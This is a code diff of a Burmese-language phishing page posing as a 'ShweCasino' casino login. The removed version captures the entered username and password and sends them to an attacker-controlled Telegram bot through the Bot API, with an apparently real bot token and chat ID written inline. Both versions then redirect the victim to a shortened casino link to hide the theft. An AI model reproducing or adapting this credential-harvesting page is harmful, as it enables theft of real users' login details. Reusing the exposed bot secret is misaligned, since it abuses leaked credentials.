@@ -1,107 +1,74 @@
 <!DOCTYPE html>
 <html lang="my">
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>ShweCasino Login</title>
+<title>Login</title>
 
 <style>
 
 body{
 margin:0;
+padding:0;
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
 background:#8b0000;
-font-family: Myanmar Text;
+font-family:Arial;
 color:white;
 }
 
-/* banner */
-
-.banner img{
-width:100%;
-height:220px;
-object-fit:cover;
-}
-
-/* container */
-
-.container{
-padding:20px;
-}
-
-/* title */
-
-.title{
+.login-box{
+width:320px;
+background:#6b0000;
+padding:25px;
+border-radius:10px;
 text-align:center;
-font-size:28px;
-color:#ffd27f;
+}
+
+h2{
 margin-bottom:20px;
 }
 
-/* input */
-
 input{
 width:100%;
-padding:15px;
-margin:10px 0;
+padding:10px;
+margin:8px 0;
 border:none;
-border-radius:12px;
-background:#8f2a2a;
-color:white;
-font-size:16px;
+border-radius:5px;
 }
 
-input::placeholder{
-color:#cccccc;
-}
-
-/* password */
-
-.pass-box{
-position:relative;
-}
-
-.eye{
-position:absolute;
-right:15px;
-top:17px;
-cursor:pointer;
-}
-
-/* captcha */
-
-.captcha{
-background:#e6c88f;
-color:black;
-padding:15px;
-border-radius:10px;
-text-align:center;
-font-size:26px;
-letter-spacing:10px;
-margin:10px 0;
-}
-
-/* login button */
-
-.login{
+button{
 width:100%;
-background:#f0c16b;
+padding:10px;
+background:gold;
 border:none;
-padding:16px;
-border-radius:12px;
-font-size:20px;
+border-radius:5px;
 font-weight:bold;
-margin-top:10px;
 cursor:pointer;
 }
 
-/* links */
-
-.links{
+.captcha-area{
 display:flex;
 justify-content:space-between;
-margin-top:15px;
-color:#ffd27f;
+align-items:center;
+margin:10px 0;
+}
+
+.captcha{
+background:white;
+color:black;
+padding:8px 15px;
+border-radius:5px;
+font-weight:bold;
+}
+
+.refresh{
+cursor:pointer;
+font-size:18px;
 }
 
 </style>
@@ -110,100 +77,41 @@ color:#ffd27f;
 
 <body>
 
-<div class="banner">
-<img src="logo.jpg">
+<div class="login-box">
+
+<h2>အကောင့်ထဲဝင်ရန်</h2>
+
+<input type="text" placeholder="Username">
+
+<input type="password" placeholder="Password">
+
+<div class="captcha-area">
+
+<div class="captcha" id="captcha"></div>
+
+<div class="refresh" onclick="createCaptcha()">🔄</div>
+
 </div>
 
-<div class="container">
+<input type="text" placeholder="Captcha code">
 
-<div class="title">အကောင့်ထဲဝင်ရန်</div>
-
-<input id="user" placeholder="အမည်ပြုအမည်">
-
-<div class="pass-box">
-<input type="password" id="pass" placeholder="စကားဝှက်">
-<span class="eye" onclick="showpass()"></span>
-</div>
-
-<div style="text-align:right;margin-bottom:10px;">
-စကားဝှက်မေ့နေပါသလား?
-</div>
-
-<div class="captcha">
-<span id="cap"></span>
-</div>
-
-<input id="capinput" placeholder="အပေါ်ကဂဏန်းကိုထည့်ပါ">
-
-<button class="login" onclick="login()">အကောင့်ထဲဝင်ရန်</button>
-
-<div class="links">
-<span>အကောင့်အသစ်ဖွင့်ရန်</span>
-<span>စာရင်းသွင်းရန်</span>
-</div>
+<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>
 
 </div>
 
 <script>
 
-/* captcha */
+function createCaptcha(){
 
-var captcha;
+let num = Math.floor(1000 + Math.random() * 9000);
 
-function makecaptcha(){
-
-captcha="";
-
-for(i=0;i<5;i++){
-captcha+=Math.floor(Math.random()*10);
-}
-
-document.getElementById("cap").innerHTML=captcha;
+document.getElementById("captcha").innerText = num;
 
 }
 
-makecaptcha();
-
-/* show password */
-
-function showpass(){
-
-var p=document.getElementById("pass");
-
-if(p.type==="password"){
-p.type="text";
-}else{
-p.type="password";
-}
-
-}
-
-/* login */
+createCaptcha();
 
 function login(){
-
-var user=document.getElementById("user").value;
-var pass=document.getElementById("pass").value;
-var cap=document.getElementById("capinput").value;
-
-if(cap!=captcha){
-
-alert("captcha မှားနေပါတယ်");
-makecaptcha();
-return;
-
-}
-
-/* TELEGRAM BOT */
-
-var token="BOT_TOKEN";8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c
-var chatid="CHAT_ID";8296340452
-
-var msg="ShweCasino Login\n\nUsername: "+user+"\nPassword: "+pass;
-
-fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid+"&text="+msg);
-
-/* redirect */
 
 window.location.href="https://is.gd/shwecasino_com";
 
